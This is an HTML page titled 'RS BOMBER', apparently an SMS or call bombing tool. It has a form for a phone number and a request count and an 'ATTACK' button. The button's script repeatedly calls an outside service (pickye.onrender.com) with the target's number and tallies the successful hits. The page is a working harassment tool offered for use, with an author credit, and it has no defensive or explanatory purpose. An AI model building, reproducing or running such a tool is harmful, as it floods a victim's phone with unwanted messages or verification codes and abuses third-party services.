<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RS BOMBER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: navy;
            color: white;
        }
        .form-container {
            background-color: #2c2c2c;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.5);
            max-width: 400px;
            width: 100%;
            text-align: center;
        }
        .form-container h2 {
            margin: 0 0 20px;
            font-size: 24px;
            color: #ffcc00;
        }
        .form-group {
            margin-bottom: 10px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            background-color: #444;
            color: white;
            font-size: 13px;
        }
        .form-group input::placeholder {
            color: #bbb;
        }
        .attack-btn {
            width: 100%;
            padding: 7px;
            background-color: #dc3545;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 10px;
            transition: background-color 0.3s, transform 0.2s;
        }
        .attack-btn:hover {
            background-color: #c82333;
            transform: scale(1.05);
        }
        .contact-link {
            display: block;
            margin-top: 20px;
            color: #00bfff;
            text-decoration: none;
            font-weight: bold;
            transition: color 0.3s;
        }
        .contact-link:hover {
            color: #0099cc;
            text-decoration: underline;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #00bfff;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>RS BOMBER</h2>
        <div class="form-group">
            <input type="text" id="phoneNumber" placeholder="Number">
        </div>
        <div class="form-group">
            <input type="number" id="amount" placeholder="Amount">
        </div>
        <button class="attack-btn" onclick="sendRequests()">ATTACK</button>
        <a href="mailto:owner@example.com" class="contact-link">Contact Site Owner</a>
        <div class="footer">Made By SabujðŸ’š</div>
    </div>

    <script>
        async function sendRequests() {
            const phoneNumber = document.getElementById('phoneNumber').value;
            const amount = document.getElementById('amount').value;

            if (!phoneNumber || !amount) {
                alert('Enter both fields.');
                return;
            }

            const url = `https://pickye.onrender.com?number=${phoneNumber}`;
            let successCount = 0;

            for (let i = 0; i < amount; i++) {
                try {
                    const response = await fetch(url);
                    const data = await response.json();
                    if (data && data.status === "SUCCESSFUL") {
                        successCount++;
                    }
                } catch (error) {
                    console.error('Error:', error);
                }
            }

            alert(`Successful requests: ${successCount}/${amount}`);
        }
    </script>
</body>
</html>
